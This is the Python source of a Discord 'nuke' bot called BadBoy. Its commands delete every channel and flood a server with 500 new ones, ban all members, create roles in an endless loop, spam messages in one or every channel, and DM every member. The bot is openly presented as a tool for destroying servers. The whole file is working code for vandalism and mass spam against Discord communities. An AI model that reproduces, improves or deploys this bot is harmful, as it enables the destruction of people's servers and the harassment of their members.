#BadBoy
#by loTus01

import discord
from discord.ext.commands import *
from discord.ext import commands
import asyncio
from discord import Permissions

##PREFIX##
bot = commands.Bot(command_prefix="%")
bot.remove_command('help')

TOKEN = "UR BOT TOKEN HERE"

help_msg = ('''

=======================<< BadBoy >>=======================
 %raid = Destroys the server 
 %clear {number} = nuke the server
 %role = creates mass role
 %spam {number} {message} = spam in the channel
 %spamall {numer} {message} = spam in every channel
 %banall = bann's everybody
 %dmall {messahe} = dm all
=======================<< BadBoy >>=======================
 ''')

embedVar = discord.Embed(title="Bad Boy, By loTus01", color=0x00ff00)
embedVar.add_field(name="Raid cmd", value=help_msg, inline=True)

##BOT IS READY##
@bot.event
async def on_ready():
	
	print("========================")
	print("  BadBoy is now online!")
	print(" let's nuke somme servers")
	print("=========================")
	print()
	print(help_msg)

 ## %SPAM ##
@bot.command(pass_context=True)
async def spam(ctx, num, message): 
	num2 = int(num)
	await ctx.message.delete()
	print(f"\n Spaming {num2}....")
	for i in range(num2):
		await ctx.send(message)
 

## %ROLE##
@bot.command(pass_context=True)
async def role(ctx):
    role_place = True
    await ctx.message.delete()
    print("\n=======================")
    print("CREATING ROLES...")
    print("=======================\n")
    i = 0
    while role_place == True:
        i += 1
        try:
            await ctx.guild.create_role(name="oupsi")
            print(f"[+] role added, {i} done")
        except:
            print(f"[~] NO MORE ROLE SPACE, {i} done")

## %RAID ##
@bot.command(pass_context=True)
async def raid(ctx):
    await ctx.message.delete()
    print("\n=======================")
    print("DELETING CHANELS...")
    print("=======================\n")
    i = 0
    for c in ctx.guild.channels:
    	i = i + 1
    	await c.delete()
    	print(f"[-] channel deleted, {i} done")	
    print("\n=======================")
    print("CREATING CHANELS...")
    print("=======================\n")
    for i in range(500):
    	guild = ctx.message.guild
    	await guild.create_text_channel("UgotFucked")
    	print(f"[+] channel created, {i} donne")
    
## %CLEAR ##
@bot.command(pass_context=True)
async def clear(ctx):
    await ctx.message.delete()
    print("\n=======================")
    print("DELETING CHANELS...")
    print("=======================\n")
    i = 0
    for c in ctx.guild.channels:
    	i = i + 1
    	await c.delete()
    	print(f"[-] channel deleted, {i} done")
    print("Done !")
    await ctx.guild.create_text_channel("nuked")
    print("[-] channel created, 1 done")
    print("Done !")

## %BANALL ##
@bot.command(pass_context=True)
async def banall(ctx):
    num = 0
    for member in ctx.guild.members:
        try:
            await member.ban()
            print(f"[+] Banned {member}")
            num += 1
        except:
            print(f"[-] Could not ban {member}")
    print(f"\n[+] Finished baning, sucesfuly baned {num} users")

## %DMALL ##
@bot.command(pass_context=True)
async def dmall(ctx, *, pub):
    num = 0
    for member in ctx.guild.members:
        try:
            await member.send(pub)
            print(f"[+] DM sended to {member}")
            num += 1
        except:
            print(f"[-] Could not sended DM to {member}")
    print(f"\n[+] Finished sending dm, sucesfuly sended to {num} users")

## %HELP ##
@bot.command(pass_context=True)
async def spamall(ctx, num, *, message):
    num = int(num)
    for a in range(num):
        for channel in ctx.guild.channels:
            await channel.send(message)

## %HELP ##
@bot.command(pass_context=True)
async def help(ctx):
	print("Help message sended\n")
	await ctx.message.delete()
	await ctx.send(embed=embedVar)

bot.run (TOKEN)
